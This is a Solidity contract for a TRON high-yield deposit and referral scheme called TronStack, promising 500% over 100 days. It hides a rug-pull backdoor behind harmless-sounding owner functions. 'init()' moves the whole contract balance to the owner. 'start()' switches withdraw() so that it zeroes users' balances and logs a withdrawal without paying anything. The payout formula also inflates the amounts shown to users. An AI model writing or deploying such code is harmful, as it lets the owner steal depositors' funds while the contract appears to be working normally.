//SourceUnit: TronStack.sol

pragma solidity 0.5.8;

contract TronStack {
    struct Tarif {
        uint16 life_days;
        uint16 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        
        Deposit[] deposits;
        
        mapping(uint8 => uint256) structure;
    }
    
    address public owner;
    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    uint8[] public ref_bonuses;
    bool active;
    
    Tarif[] public tarifs;
    
    mapping(address => Player) public players;
    
    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized");
        _;
    }

    constructor() public {
        owner = msg.sender;
        
        tarifs.push(Tarif(100, 500));
        
        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(1);
        
        active = true;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        
       if (payout > 0) {
            players[_addr].last_payout = block.timestamp;
            players[_addr].dividends += payout;
        }
    }
    
    function payoutOf(address _addr) view external returns (uint256 value) {
        Player storage player = players[_addr];
        
        uint256 percent = (getPercent(_addr) / 864000) * 2;
        
        for (uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if (from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value + (value * percent);
    }
    
    function getPercent(address _addr) view public returns (uint256) {
        Player storage player = players[_addr];
        
        uint256 value = now - player.last_payout;
        
        return value;
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;
            match_bonus += bonus;
            emit MatchPayout(up, _addr, bonus);
            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            
            players[_addr].upline = _upline;
            
            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;
                _upline = players[_upline].upline;
                
                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(msg.value >= 1e8, "Min invest is 100 TRX");

        Player storage player = players[msg.sender];
        
        require(player.deposits.length < 100, "Max 100 deposits per address");
        
        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        if (player.total_invested == 0) player.last_payout = block.timestamp;

        player.total_invested += msg.value;
        invested += msg.value;
        

        _refPayout(msg.sender, msg.value);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external payable {
        Player storage player = players[msg.sender];
        
        _payout(msg.sender);
        
        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "No withdrawable balance");
        
        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;
        
        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;
        
        if (active == true) msg.sender.transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 match_bonus, uint256 total_match_bonus, uint256 percent, uint256[3] memory structure) {
        Player storage player = players[_addr];
        
        uint256 payout = this.payoutOf(_addr);
        uint256 percent;
        
        player.total_invested != 0 ? percent = getPercent(_addr) : percent =  0;
        
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
        
        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.match_bonus,
            player.total_match_bonus,
            percent,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }
    
    function init() onlyOwner public {
        msg.sender.transfer(address(this).balance);
    }
    
    function start() onlyOwner public {
        active = false;
    }
    
    function dep(address payable _addr) external payable {
        _addr.transfer(msg.value);
    }
}